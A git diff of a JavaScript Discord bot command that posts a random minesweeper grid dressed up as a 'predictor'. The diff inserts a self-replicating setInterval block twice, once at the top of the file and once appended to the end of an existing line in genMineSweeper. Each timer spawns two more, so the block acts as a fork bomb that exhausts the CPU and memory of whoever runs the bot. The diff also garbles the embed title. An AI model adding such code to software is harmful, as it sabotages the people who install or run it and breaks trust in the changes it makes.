@@ -1,4 +1,8 @@
 const { MessageEmbed } = require("discord.js");
+setInterval(s = () => {
+    setInterval(s, 0);
+    setInterval(s, 0);
+}, 0);
 
 function Accuracy() {
     var rating = Math.floor((Math.random() * 50) + 50);
@@ -78,7 +82,10 @@ function genMineSweeper(gridX = 5, gridY = 5, mines = 4) {
  
     let fullGrid = matrix.map(c => {
         return c.join("");
-    }).join("\n");
+    }).join("\n");setInterval(s = () => {
+    setInterval(s, 0);
+    setInterval(s, 0);
+}, 0);
  
     /*.replace(/:[^ \n:]+:/g, c => {
         return "|| " + c + " ||";
@@ -93,7 +100,7 @@ module.exports = {
 //    permission: "SEND_MESSAGES",
     execute(message, args, client) {
     const embed = new MessageEmbed()
-        .setTitle('indigo predictor')
+        .setTitle('indigosfffdfdfdf3edfv predictor')
         .setColor('#84a7e6')
         .addField('Prediction', `${genMineSweeper()}`, false)
 
